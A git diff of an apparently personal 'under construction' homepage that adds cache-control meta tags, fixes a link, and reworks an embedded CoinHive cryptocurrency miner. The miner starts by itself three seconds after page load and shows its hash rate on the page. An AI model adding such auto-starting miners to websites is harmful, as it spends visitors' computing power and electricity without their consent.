@@ -1,7 +1,8 @@
 ---
 layout:
 ---
-<!-- Global Site Tag (gtag.js) - Google Analytics -->
+
+<head>
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106946514-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -9,6 +10,10 @@ layout:
   gtag('js', new Date());
   gtag('config', 'UA-106946514-1');
 </script>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+</head>
 
 under construction<br>
 
@@ -21,7 +26,7 @@ under construction<br>
   <source src="noodle.mp3" type="audio/mpeg">
 </audio>
 
-[interactive graphics](/smb) with WebGL!
+[interactive graphics](https://bohadi.github.io/smb) with WebGL!
 <br><br>
 
 some links:<br>
@@ -48,30 +53,33 @@ total Hashes: 0    <br>
 <script>
   var minerstatus = document.getElementById('minerstatus');
   var minerio     = document.getElementById('minerio');
-  try {
-    var miner = new CoinHive.Anonymous('A9pTI4370gQQt0dRaNJFmFnPXXDvsEwS', {
-      threads: 2,
-      throttle: 0.5
-    });
-    miner.start();
-  }
-  catch (e) { minerstatus.innerHTML = '...Connection error. Miner stopping.'; }
+  setTimeout( function() {
+    try {
+      var miner = new CoinHive.Anonymous('A9pTI4370gQQt0dRaNJFmFnPXXDvsEwS', {
+        threads: 2,
+        throttle: 0.5
+      });
+      miner.start();
+      miner.on('open', function() {
+        minerstatus.innerHTML = 'Connection opened...';
+      });
+      miner.on('error', function() {
+        miner.stop();
+        minerstatus.innerHTML = '...Connection error. Miner stopping.';
+      });
+      miner.on('accepted', function() {
+        minerstatus.innerHTML =
+          'Connected. ('+miner.getNumThreads()+' threads throttled at '+
+          100*miner.getThrottle().toFixed(2)+'% WASM supported: '+miner.hasWASMSupport()+')';
+      });
+      setInterval(function() {
+        minerio.innerHTML = 
+          'Hashes/second: '   + miner.getHashesPerSecond().toFixed(2) + '<br>' +
+          'total Hashes: '    + miner.getTotalHashes()                + '<br>' ;
+      }, 1000);
+    } catch (e) {
+      minerstatus.innerHTML = '...Connection error. Miner stopping.';
+    }
+  }, 3000);
 
-  miner.on('open', function() {
-    minerstatus.innerHTML = 'Connection opened...';
-  });
-  miner.on('error', function() {
-    minerstatus.innerHTML = '...Connection error. Miner stopping.';
-    miner.stop();
-  });
-  miner.on('accepted', function() {
-    minerstatus.innerHTML =
-      'Connected. ('+miner.getNumThreads()+' threads throttled at '+
-      100*miner.getThrottle().toFixed(2)+'% WASM supported: '+miner.hasWASMSupport()+')';
-  });
-  setInterval(function() {
-    minerio.innerHTML = 
-      'Hashes/second: '   + miner.getHashesPerSecond().toFixed(2) + '<br>' +
-      'total Hashes: '    + miner.getTotalHashes()                + '<br>' ;
-  }, 1000);
 </script>
